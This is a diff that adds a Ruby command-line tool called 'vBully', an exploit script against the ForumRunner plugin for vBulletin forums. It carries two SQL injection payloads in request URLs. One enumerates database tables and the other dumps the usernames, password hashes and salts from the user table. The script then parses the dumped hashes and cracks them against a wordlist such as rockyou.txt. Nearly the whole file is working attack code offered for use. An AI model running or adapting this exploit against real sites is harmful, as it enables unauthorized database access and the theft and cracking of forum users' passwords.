@@ -1,0 +1,183 @@
+#!/usr/bin/env ruby
+require 'colorize'
+require 'mechanize'
+require 'gibberish'
+
+banner = %[
++++++++++++++++++++++++++++++++++++++++++++++++++++
++           888888b.            888 888           +
++       888      "88b           888 888           +
++       888      .88P           888 888           +
++  888  888 8888888K.  888  888 888 888 888  888  +
++  888  888 888  "Y88b 888  888 888 888 888  888  +
++  Y88  88P 888    888 888  888 888 888 888  888  +
++   Y8bd8P  888   d88P Y88b 888 888 888 Y88b 888  +
++    Y88P   8888888P"   "Y88888 888 888  "Y88888  +
++                                            888  +
++    by: DataNoid                       Y8b d88P  +
++                                        "Y88P"   +
++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+                 vBully v.1.1.0
+
+Usage:
+vbully -u http://example.com -s -p -c -w rockyou.txt -o example
+
+-d    Dump Mode (Default: 2)
+        [1] Enumerate Tables
+        [2] Dump User Table
+
+-u    URL (can use -s option)
+-p    Parse results for user:hash:salt combinations
+-c    Crack hashes (must provide -w <wordlist>)
+-w    Specify wordlist (decompressed)
+-o    Write results to file (provide file base name)
+
+]
+colp = "+".cyan
+BANNER = banner.gsub("+", colp)
+
+def vbdump(url)
+
+  m = Mechanize.new
+
+  page = false
+
+  vectors = [
+    nil,
+    "/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -",
+    "/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -"
+  ]
+
+  if url != 0
+    puts "Checking #{url} for ForumRunner Vulnerability".yellow
+    begin
+      page = m.get(url+vectors[@dm]).search('html').to_s
+    rescue => e
+      puts "vBdump: #{e}"
+    end
+  else
+    puts "Checking #{@url} for ForumRunner Vulnerability".yellow
+    begin
+      page = m.get(@url+vectors[@dm]).search('html').to_s
+    rescue => e
+      puts "vBdump: #{e}"
+    end
+  end
+  return page
+
+end
+
+def vbparse(txt)
+  puts "Checking results".white
+  # get vB =>v3.x.x hashes
+  r3 = /^[a-z0-9A-Z' '.]{1,}:[a-z0-9]{32}:[\s\S]{3}$/
+  # get vB ~4.x.x hashes
+  r4 = /^[a-z0-9A-Z' '.]{1,}:[a-z0-9]{32}:[\s\S]{30}$/
+  res = []
+  txt = txt.split("<br>")
+  txt.each do |t|
+    s = t.scan(r3)
+    if s.class == Array
+      s.each{|h| res << h}
+    else
+      res << s
+    end
+    s = t.scan(r4)
+    if s.class == Array
+      s.each{|h| res << h}
+    else
+      res << s
+    end
+  end
+  puts "Site appears to be vulnerable".red if res.length > 1
+  res = false unless res.length > 1
+  res.each do |r|
+    File.open(@fbase+".hash", "a"){|f| f.puts r}
+  end
+  return res
+end
+
+def vbcrack(hashes)
+  puts "Starting cracking session...".yellow
+  words = File.open(@wlist).read
+  cracked = []
+  hashes.each do |hash|
+    user, hash, salt = hash.split(":", 3)
+    words.each_line do |word|
+      x = Gibberish::MD5(word.strip)
+      y = Gibberish::MD5("#{x}#{salt.strip}")
+      if y == hash
+        entry = "#{user}:#{word}"
+        file = File.open(@fbase+".cracked", "a"){|f| f.puts entry}
+        puts entry.green
+      end
+    end
+  end
+end
+
+# spider function not in use, will add in next version
+def spider
+# not actually spidering, just creating common urls
+
+  http, base = @url.split("//", 2)
+
+  # take off trailing slash or dir if present
+  url = "#{http}//#{base.split("/", 2).first}"
+
+  urls = [
+    "#{url}/forums",
+    "#{url}/forum",
+    "#{http}//forums.#{url}"
+  ]
+  return urls
+end
+
+def run
+  if @sp ==1
+    urls = spider
+    urls.each do |u|
+      @vuln = vbdump(u)
+      res = vbparse(@vuln) if @pr and @vuln
+      vbcrack(res) if res and @cr
+    end
+  else
+    @vuln = vbdump(0)
+    res = vbparse(@vuln) if @pr and @vuln
+    vbcrack(res) if res and @cr
+  end
+  puts "Done."
+end
+
+def err_check
+  return false
+end
+
+if ARGV.empty?
+  puts BANNER
+else
+  puts BANNER.split("Usage", 2).first
+  @dm, @pr, @cr = 2, false, false
+  ARGV.each do |arg|
+    a = ARGV.index(arg)+1
+    case arg
+    when "-d"
+      @dm = ARGV[a].to_i
+    when "-u"
+      @url = ARGV[a]
+#    when "-s"
+#      @sp = true
+    when "-p"
+      @pr = true
+    when "-c"
+      @cr = true
+    when "-w"
+      @wlist = ARGV[a]
+    when "-o"
+      @fbase = ARGV[a]
+    end
+  end
+  errors = err_check
+  run unless errors
+end
